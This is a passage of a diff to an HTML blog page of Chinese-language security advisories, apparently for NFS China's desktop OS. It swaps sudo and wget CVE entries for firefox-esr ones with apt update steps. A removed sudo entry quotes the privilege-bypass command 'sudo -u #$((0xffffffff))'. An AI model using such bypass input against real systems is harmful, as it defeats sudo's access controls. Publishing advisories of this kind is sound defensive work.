@@ -64,10 +64,10 @@
       <div class="outer">
         <section id="main">
   
-    <article id="post-cve-2019-18634安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5448安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/10/cve-2019-18634%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T06:30:51.000Z" itemprop="datePublished">2022-03-10</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5448%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T10:42:50.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -78,7 +78,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2019-18634%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2019-18634分析报告</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5448%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5448安全公告</a>
     </h1>
   
 
@@ -86,57 +86,38 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>In Sudo before 1.8.26, if pwfeedback is enabled in /etc/sudoers, users can trigger a stack-based buffer overflow in the privileged sudo process. (pwfeedback is a default setting in Linux Mint and elementary OS; however, it is NOT the default for upstream and many other packages, and would exist only if enabled by an administrator.) The attacker needs to deliver a long string to the stdin of getln() in tgetpass.c.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2019-18634"><a href="#漏洞编号：-CVE-2019-18634" class="headerlink" title="漏洞编号： CVE-2019-18634"></a>漏洞编号： CVE-2019-18634</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：7-8"><a href="#CVSS3-1评分：7-8" class="headerlink" title="CVSS3.1评分：7.8"></a>CVSS3.1评分：7.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2019-18634">https://nvd.nist.gov/vuln/detail/cve-2019-18634</a></p>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox在解密某些 Clearkey 加密的媒体内容时，存在越界写入漏洞，容易被攻击者利用导致崩溃。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5448"><a href="#漏洞编号：-CVE-2017-5448" class="headerlink" title="漏洞编号： CVE-2017-5448"></a>漏洞编号： CVE-2017-5448</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：8-6"><a href="#CVSS3-1评分：8-6" class="headerlink" title="CVSS3.1评分：8.6"></a>CVSS3.1评分：8.6</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5448">https://nvd.nist.gov/vuln/detail/CVE-2017-5448</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2019-18634%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4yt0000cb214g48m5pqb" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-cve-2019-14287安全公告" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2022/03/10/cve-2019-14287%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T06:30:37.000Z" itemprop="datePublished">2022-03-10</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2019-14287%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2019-14287分析报告</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a “sudo -u #$((0xffffffff))” command.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2019-14287"><a href="#漏洞编号：-CVE-2019-14287" class="headerlink" title="漏洞编号： CVE-2019-14287"></a>漏洞编号： CVE-2019-14287</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：8-8"><a href="#CVSS3-1评分：8-8" class="headerlink" title="CVSS3.1评分：8.8"></a>CVSS3.1评分：8.8</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2019-14287">https://nvd.nist.gov/vuln/detail/cve-2019-14287</a></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2019-14287%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysw0004b2140uzk80sm" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5448%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3s000iyy3e4nu97w2t" class="article-share-link">Share</a>
       
       
     </footer>
@@ -146,10 +127,10 @@
 
 
   
-    <article id="post-cve-2017-1000368安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5454安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/10/cve-2017-1000368%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T06:30:16.000Z" itemprop="datePublished">2022-03-10</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5454%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T10:34:34.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -160,7 +141,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2017-1000368%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-1000368分析报告</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5454%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5454安全公告</a>
     </h1>
   
 
@@ -168,19 +149,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Todd Miller’s sudo version 1.8.20p1 and earlier is vulnerable to an input validation (embedded newlines) in the get_process_ttyname() function resulting in information disclosure and command execution.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-1000368"><a href="#漏洞编号：-CVE-2017-1000368" class="headerlink" title="漏洞编号： CVE-2017-1000368"></a>漏洞编号： CVE-2017-1000368</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：8-2"><a href="#CVSS3-1评分：8-2" class="headerlink" title="CVSS3.1评分：8.2"></a>CVSS3.1评分：8.2</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2017-1000368">https://nvd.nist.gov/vuln/detail/cve-2017-1000368</a></p>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox可以绕过沙盒中的文件系统访问保护的机制，以使用文件选择器越权访问文件。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5454"><a href="#漏洞编号：-CVE-2017-5454" class="headerlink" title="漏洞编号： CVE-2017-5454"></a>漏洞编号： CVE-2017-5454</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：7-5"><a href="#CVSS3-1评分：7-5" class="headerlink" title="CVSS3.1评分：7.5"></a>CVSS3.1评分：7.5</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5454">https://nvd.nist.gov/vuln/detail/CVE-2017-5454</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2017-1000368%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysm0001b214cc2a1ewh" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5454%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3t000lyy3ecwo21o66" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" rel="tag">安全公告</a></li></ul>
-
     </footer>
   </div>
   
@@ -188,10 +190,10 @@
 
 
   
-    <article id="post-cve-2017-1000367安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5455安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/10/cve-2017-1000367%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-10T06:30:10.000Z" itemprop="datePublished">2022-03-10</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5455%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T10:22:53.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -202,7 +204,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/10/cve-2017-1000367%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-1000367分析报告</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5455%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5455安全公告</a>
     </h1>
   
 
@@ -210,19 +212,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-sudo安全更新"><a href="#NFS-SA-2022-03-sudo安全更新" class="headerlink" title="NFS-SA-2022-03: sudo安全更新"></a>NFS-SA-2022-03: sudo安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Todd Miller’s sudo version 1.8.20 and earlier is vulnerable to an input validation (embedded spaces) in the get_process_ttyname() function resulting in information disclosure and command execution.</p>
-<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-1000367"><a href="#漏洞编号：-CVE-2017-1000367" class="headerlink" title="漏洞编号： CVE-2017-1000367"></a>漏洞编号： CVE-2017-1000367</h3><h3 id="软件包名：-sudo"><a href="#软件包名：-sudo" class="headerlink" title="软件包名： sudo"></a>软件包名： sudo</h3><h3 id="CVSS3-1评分：6-4"><a href="#CVSS3-1评分：6-4" class="headerlink" title="CVSS3.1评分：6.4"></a>CVSS3.1评分：6.4</h3><h3 id="漏洞评级：中危"><a href="#漏洞评级：中危" class="headerlink" title="漏洞评级：中危"></a>漏洞评级：中危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="NFS4-0-NFS3-1"><a href="#NFS4-0-NFS3-1" class="headerlink" title="NFS4.0 NFS3.1"></a>NFS4.0 NFS3.1</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
-<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到sudo_1.8.19p1-2.1+deb9u3（待定，这是上游的版本）</p>
-<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/cve-2017-1000367">https://nvd.nist.gov/vuln/detail/cve-2017-1000367</a></p>
+        <h2 id="NFS-SA-2022-04-firefox-esr安全更新"><a href="#NFS-SA-2022-04-firefox-esr安全更新" class="headerlink" title="NFS-SA-2022-04: firefox-esr安全更新"></a>NFS-SA-2022-04: firefox-esr安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Firefox是一款免费的开源浏览器，系统当前版本的firefox存在漏洞，与另一个远程执行代码结合可以造成沙盒逃逸和提权。</p>
+<h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><h3 id="漏洞编号：-CVE-2017-5455"><a href="#漏洞编号：-CVE-2017-5455" class="headerlink" title="漏洞编号： CVE-2017-5455"></a>漏洞编号： CVE-2017-5455</h3><h3 id="软件包名：-firefox-esr"><a href="#软件包名：-firefox-esr" class="headerlink" title="软件包名： firefox-esr"></a>软件包名： firefox-esr</h3><h3 id="CVSS3-1评分：7-5"><a href="#CVSS3-1评分：7-5" class="headerlink" title="CVSS3.1评分：7.5"></a>CVSS3.1评分：7.5</h3><h3 id="漏洞评级：高危"><a href="#漏洞评级：高危" class="headerlink" title="漏洞评级：高危"></a>漏洞评级：高危</h3><h2 id="受影响NFS版本"><a href="#受影响NFS版本" class="headerlink" title="受影响NFS版本"></a>受影响NFS版本</h2><h3 id="方德桌面操作系统V3-1-方德桌面操作系统V4-0"><a href="#方德桌面操作系统V3-1-方德桌面操作系统V4-0" class="headerlink" title="方德桌面操作系统V3.1   方德桌面操作系统V4.0"></a>方德桌面操作系统V3.1   方德桌面操作系统V4.0</h3><h3 id="更新包下载地址"><a href="#更新包下载地址" class="headerlink" title="更新包下载地址"></a>更新包下载地址</h3><p>待定</p>
+<h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>升级到 firefox-esr_52.9.0esr-1<del>deb9u1_amd64.deb  firefox-esr_l10n-zh-cn_52.9.0esr-1</del>deb9u1_all.deb</p>
+<p>方法一：在线更新</p>
+<ol>
+<li>添加以下行到安装源配置文件中</li>
+</ol>
+<p>方德桌面操作系统V3.1添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-3.1-security/">http://update.os.nfschina.com/static/nfs-3.1-security/</a> base main</p>
+<p>方德桌面操作系统V4.0添加如下行到/etc/apt/sources.list.d/official-package-repositories.list文件中：<br>deb <a target="_blank" rel="noopener" href="http://update.os.nfschina.com/static/nfs-4.0-security/">http://update.os.nfschina.com/static/nfs-4.0-security/</a> base main</p>
+<ol start="2">
+<li>执行源同步命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>执行安装更新命令，命令如下：</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install firefox-esr</span><br></pre></td></tr></table></figure>
+
+<p>方法二：下载安装包进行升级安装</p>
+<p>通过下面的“软件更新”中的地址下载软件包，使用本地安装命令进行升级安装,命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg -i Packagename</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>升级完成后是否需要重启服务或操作系统：<br>无需重启操作系统与服务即可使漏洞修复生效。</li>
+</ol>
+<h2 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h2><p><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2017-5455">https://nvd.nist.gov/vuln/detail/CVE-2017-5455</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://yoursite.com/2022/03/10/cve-2017-1000367%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl11k4ysj0000b214d6rkhbsn" class="article-share-link">Share</a>
+      <a data-url="http://yoursite.com/2022/04/14/firefox-CVE-2017-5455%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" data-id="cl2agzt3u000myy3e5ocig551" class="article-share-link">Share</a>
       
       
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve/" rel="tag">cve</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sudo/" rel="tag">sudo</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/" rel="tag">分析报告</a></li></ul>
-
     </footer>
   </div>
   
@@ -230,10 +253,10 @@
 
 
   
-    <article id="post-cve-2017-13090安全公告" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="post-firefox-CVE-2017-5456安全公告" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2022/03/09/cve-2017-13090%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
-  <time datetime="2022-03-09T08:55:21.000Z" itemprop="datePublished">2022-03-09</time>
+    <a href="/2022/04/14/firefox-CVE-2017-5456%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/" class="article-date">
+  <time datetime="2022-04-14T10:19:07.000Z" itemprop="datePublished">2022-04-14</time>
 </a>
     
   </div>
@@ -244,7 +267,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2022/03/09/cve-2017-13090%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">cve-2017-13090安全公告</a>
+      <a class="article-title" href="/2022/04/14/firefox-CVE-2017-5456%E5%AE%89%E5%85%A8%E5%85%AC%E5%91%8A/">firefox-CVE-2017-5456安全公告</a>
     </h1>
   
 
@@ -252,19 +275,40 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="NFS-SA-2022-03-wget安全更新"><a href="#NFS-SA-2022-03-wget安全更新" class="headerlink" title="NFS-SA-2022-03: wget安全更新"></a>NFS-SA-2022-03: wget安全更新</h2><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>The retr.c:fd_read_body() function is called when processing OK responses. When the response is sent chunked in wget before 1.19.2, the chunk parser uses strtol() to read each chunk’s length, but doesn’t check that the chunk length is a non-negative number. The code then tries to read the chunk in pieces of 8192 bytes by using the MIN() macro, but ends up passing the negative chunk length to retr.c:fd_read(). As fd_read() takes an int argument, the high 32 bits of the chunk length are discarded, leaving fd_read() with a completely attacker controlled length argument. The attacker can corrupt malloc metadata after the allocated buffer.</p>
